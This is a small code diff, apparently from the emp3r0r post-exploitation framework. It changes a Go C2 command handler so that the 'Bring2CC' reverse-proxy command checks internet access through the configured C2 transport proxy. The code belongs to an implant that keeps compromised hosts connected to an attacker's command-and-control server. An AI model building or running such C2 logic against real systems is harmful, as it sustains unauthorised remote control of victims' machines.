@@ -56,7 +56,7 @@ func C2CommandsHandler(cmdSlice []string) (out string) {
 		addr := cmdSlice[1]
 		out = "Bring2CC: Reverse proxy for " + addr + " finished"
 
-		hasInternet := tun.HasInternetAccess(emp3r0r_data.CCAddress)
+		hasInternet := tun.HasInternetAccess(emp3r0r_data.CCAddress, RuntimeConfig.C2TransportProxy)
 		isProxyOK := tun.IsProxyOK(RuntimeConfig.C2TransportProxy, emp3r0r_data.CCAddress)
 		if !hasInternet && !isProxyOK {
 			out = "Error: We don't have any internet to share"
